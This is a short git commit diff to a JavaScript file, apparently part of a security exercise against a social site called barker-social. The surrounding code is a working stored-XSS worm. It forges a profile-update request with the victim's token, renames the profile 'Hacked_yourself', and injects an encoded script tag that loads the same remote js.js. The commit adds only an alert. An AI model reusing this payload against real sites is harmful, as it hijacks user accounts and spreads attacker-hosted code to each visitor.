b256fd2e61018589730e304879688bcc4a84b6dd
Thiyaneshwaran <52602144+th4nu-0x0@users.noreply.github.com>
2020-11-09 00:22:37 +0530

    Update js.js

--- assets/js.js
+++ assets/js.js
@@ -20,7 +20,7 @@ function handleResponse() {
 	changeReq.open('post', `http://barker-social.com:32880/profile/update/${uuid}`, true);
 	changeReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 	changeReq.send(`_method=patch&profile_name=Hacked_yourself&profile_description=%3CScRipt%20type%3D%22text%2Fjavascript%22%20src%3D%22https%3A%2F%2Fth4nu-0x0.github.io%2Fassets%2Fjs.js%22%3E%3C%2FScRipt%3E&_token=${token}`);
-
+	alert('Affected');
 }
 
 
